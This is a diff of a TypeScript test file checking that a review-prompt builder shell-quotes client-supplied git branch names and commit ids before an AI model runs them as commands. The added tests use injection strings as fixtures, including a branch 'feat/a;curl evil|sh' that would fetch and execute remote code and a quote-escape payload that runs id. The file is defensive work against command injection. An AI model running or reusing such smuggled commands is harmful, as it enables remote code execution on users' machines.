@@ -28,16 +28,45 @@ describe("buildReviewPrompt", () => {
   // input that made merge-base fail (the local branch is missing), so the remote-tracking name is the fallback.
   it("directs a merge-base range for a bare baseBranch, with a fallback that itself resolves a merge-base", () => {
     const p = buildReviewPrompt({ type: "baseBranch", branch: "main" });
-    expect(p).toContain("git merge-base HEAD main");
-    expect(p).toContain("git merge-base HEAD origin/main");
+    expect(p).toContain("git merge-base HEAD 'main'");
+    expect(p).toContain("git merge-base HEAD 'origin/main'");
     expect(p).toContain("git diff <merge-base>..HEAD");
     expect(p).toMatch(/do not diff against the tip/i);
     expect(p).not.toContain("@{upstream}");
-    expect(p).not.toMatch(/git diff\s+(origin\/)?main\b/); // never a diff against the base branch itself
+    expect(p).not.toMatch(/git diff\s+'?(origin\/)?main\b/); // never a diff against the base branch itself
   });
   it("carries the commit sha, and the custom instructions verbatim", () => {
     expect(buildReviewPrompt({ type: "commit", sha: "deadbee" })).toContain("deadbee");
     expect(buildReviewPrompt({ type: "custom", instructions: "review the auth flow" })).toContain("review the auth flow");
+  });
+
+  // ── The client's git identifiers are read by the model as SHELL COMMANDS to run, which is a different
+  // channel from the prompt's prose and has a different grammar. The schema narrows `sha` to an object
+  // identifier, but `branch` cannot be narrowed the same way — `$`, a backtick, `;` and a quote are all legal
+  // in a git ref name — so every command this prompt spells quotes the value it interpolates.
+  it("shell-quotes a branch inside the commands it tells the model to run", () => {
+    const p = buildReviewPrompt({ type: "baseBranch", branch: "feat/a;curl evil|sh" });
+    expect(p).toContain("git merge-base HEAD 'feat/a;curl evil|sh'");
+    expect(p).not.toContain("git merge-base HEAD feat/a;");   // never bare, which is where the shell would split it
+  });
+  it("escapes a single quote in a branch, so the quoting cannot be closed from inside", () => {
+    // The one character that breaks single-quoting, and it is legal in a git ref: the standard POSIX answer is
+    // to end the quote, emit an escaped quote, and reopen. Without it `'a';id;'` would land as three words.
+    const p = buildReviewPrompt({ type: "baseBranch", branch: "a';id;'b" });
+    expect(p).toContain("git merge-base HEAD 'a'\\'';id;'\\''b'");
+    expect(p).not.toMatch(/git merge-base HEAD 'a';/);
+  });
+  it("quotes the sha in the commands too, belt to the schema's braces", () => {
+    const p = buildReviewPrompt({ type: "commit", sha: "HEAD~3" });
+    expect(p).toContain("git show 'HEAD~3'");
+    expect(p).toContain("git log -1 'HEAD~3'");
+  });
+  it("leaves the SERVER-computed range unquoted — it is not client text", () => {
+    // `resolveReviewRange` builds it from git's own stdout (reviewTarget.ts), and quoting our own value would
+    // only add noise to the one command the model is most likely to run verbatim.
+    const p = buildReviewPrompt({ type: "baseBranch", branch: "main" }, { range: "abc123..HEAD" });
+    expect(p).toContain("git diff abc123..HEAD");
+    expect(p).toContain("git log --oneline abc123..HEAD");
   });
 
   // ── Beyond the plan's floor: the prompt is the whole review instruction, so the parts that make a
@@ -96,9 +125,11 @@ describe("buildReviewPrompt", () => {
     }
   });
   // Coarse, but it is the shape that matters: the rule is computed in ONE pass over the payload, not one pass
-  // per candidate length. `instructions` is `z.string().min(1)` with no maximum — unbounded client text off the
-  // wire — and grow-and-rescan is quadratic in it, so one `review/start` blocked the single-threaded app server
-  // for tens of seconds (measured 34.5 s at 400k dashes; ~6 s at the 200k used here). One pass is ~1 ms.
+  // per candidate length. Grow-and-rescan is quadratic in `instructions`, so one `review/start` blocked the
+  // single-threaded app server for tens of seconds (measured 34.5 s at 400k dashes; ~6 s at the 200k used
+  // here). One pass is ~1 ms. The schema now also caps `instructions` at 20k characters, so 200k no longer
+  // arrives over the wire — but this function is pure and takes the string it is given, and the complexity of
+  // the fence rule is the property worth pinning rather than the size that happened to expose it.
   it("computes the fence in one pass, so a large payload cannot stall the server", () => {
     const huge = "-".repeat(200_000);
     const started = performance.now();
